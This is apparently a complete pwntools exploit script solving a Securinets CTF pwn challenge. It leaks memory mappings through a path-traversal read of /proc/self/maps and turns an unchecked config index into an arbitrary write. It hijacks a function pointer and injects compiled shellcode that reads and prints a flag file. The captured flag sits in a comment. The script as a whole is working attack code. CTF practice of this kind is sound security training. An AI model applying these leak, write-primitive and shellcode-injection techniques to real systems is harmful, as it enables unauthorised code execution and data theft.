#!/usr/bin/env python3
from pwn import *
import struct
import tempfile
import subprocess
import os


def connect():
    if args.LOCAL:
        return gdb.debug(["./services"], api=True)
    else:
        return remote("pwn.ctf.securinets.tn", 4444)


def prompt(tube, choice):
    tube.sendlineafter(b"Choice:\n", choice)


def read_chat(tube, chat_id):
    prompt(tube, b"1")
    tube.sendlineafter(b"Chat ID:\n", chat_id)


def update_config(tube, config_index, value):
    prompt(tube, b"2")
    tube.sendlineafter(b"Config index:\n", str(config_index).encode())
    tube.sendafter(b"New config: \n", value.ljust(10, b"\0"))


def backup_messages(tube):
    prompt(tube, b"3")


def cc(src):
    with tempfile.TemporaryDirectory() as workdir:
        with open(os.path.join(workdir, "shellcode.c"), "w") as fp:
            fp.write(src)
        with open(os.path.join(workdir, "shellcode.lds"), "w") as fp:
            fp.write(
                """
SECTIONS {
    .shellcode : {
        *(.text)
        *(.rodata*)
    }
    /DISCARD/ : { *(*) }
}
"""
            )
        subprocess.check_call(
            [
                "gcc",
                "-Os",
                "-fno-stack-protector",
                "-fcf-protection=none",
                "-Wall",
                "-Wextra",
                "-Werror",
                "-nostartfiles",
                "-Wl,--build-id=none",
                "-Wl,-script=shellcode.lds",
                "shellcode.c",
                "-o",
                "shellcode.elf",
            ],
            cwd=workdir,
        )
        subprocess.check_call(
            [
                "objcopy",
                "-O",
                "binary",
                "--only-section=.shellcode",
                "shellcode.elf",
                "shellcode.bin",
            ],
            cwd=workdir,
        )
        subprocess.check_call(
            [
                "objdump",
                "-b",
                "binary",
                "-m",
                "i386:x86-64",
                "-D",
                "shellcode.bin",
            ],
            cwd=workdir,
        )
        with open(os.path.join(workdir, "shellcode.bin"), "rb") as fp:
            return fp.read()


SHELLCODE = cc(
    r"""
#include <fcntl.h>
#include <unistd.h>

#define __NR_read 0
#define __NR_write 1
#define __NR_open 2

__attribute__((always_inline)) static inline long
_syscall(int number, long arg1, long arg2, long arg3, long arg4, long arg5,
         long arg6) {
  register int rax asm("rax") = number;
  register long rdi asm("rdi") = arg1;
  register long rsi asm("rsi") = arg2;
  register long rdx asm("rdx") = arg3;
  register long r10 asm("r10") = arg4;
  register long r8 asm("r8") = arg5;
  register long r9 asm("r9") = arg6;
  asm volatile("syscall\n"
               : "+r"(rax), "+r"(rdx)
               : "r"(rdi), "r"(rsi), "r"(r10), "r"(r8), "r"(r9)
               : "rcx", "r11", "memory", "cc");
  return rax;
}

__attribute__((always_inline)) static inline ssize_t _read(int fd, void *buf,
                                                           size_t count) {
  return _syscall(__NR_read, fd, (long)buf, count, 0, 0, 0);
}

__attribute__((always_inline)) static inline ssize_t
_write(int fd, const void *buf, size_t count) {
  return _syscall(__NR_write, fd, (long)buf, count, 0, 0, 0);
}

__attribute__((always_inline)) static inline int _open(const char *pathname,
                                                       int flags, mode_t mode) {
  return _syscall(__NR_open, (long)pathname, flags, mode, 0, 0, 0);
}

void shellcode(void) {
  char buf[128];
  int fd = _open("flag", 0, 0);
  ssize_t n = _read(fd, buf, sizeof(buf));
  _write(1, buf, n); 
}
"""
)


def main():
    with connect() as tube:
        read_chat(tube, b"../" * 10 + b"proc/self/maps")
        pie = None
        backup_code = None
        while pie is None or backup_code is None:
            maps_line = tube.recvline()
            start = int(maps_line[: maps_line.index(b"-")], 16)
            if maps_line.endswith(b"/services\n") and pie is None:
                pie = start
                print(f"pie=0x{pie:x}")
            if b" rwxp " in maps_line and backup_code is None:
                backup_code = start
                print(f"backup_code=0x{backup_code:x}")
        config = pie + 0x4060
        print(f"config=0x{config:x}")
        s1 = pie + 0x4070
        print(f"s1=0x{s1:x}")
        backup_call = pie + 0x40A8
        print(f"backup_call=0x{backup_call:x}")
        s1_val = backup_code + 0x1000 - 32
        print(f"s1_val=0x{s1_val:x}")

        def arbw(p, value):
            assert p % 8 == 0
            while len(value) > 0:
                update_config(tube, (p - config) // 8, value[:8])
                p += 8
                value = value[8:]

        arbw(backup_call, struct.pack("<Q", backup_code))
        arbw(s1, struct.pack("<Q", s1_val))
        arbw(s1_val, b"backup: 1\0")
        arbw(backup_code, SHELLCODE)
        backup_messages(tube)
        # Securinets{eb90ac8ad161f08db294f465071f8f2a40e331a0eec0df31dd4dd18e80a553d1}
        tube.interactive()


if __name__ == "__main__":
    main()
